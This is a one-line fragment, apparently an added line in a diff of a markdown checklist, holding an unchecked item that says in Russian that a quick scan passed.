+- [ ] Quick scan прошёл
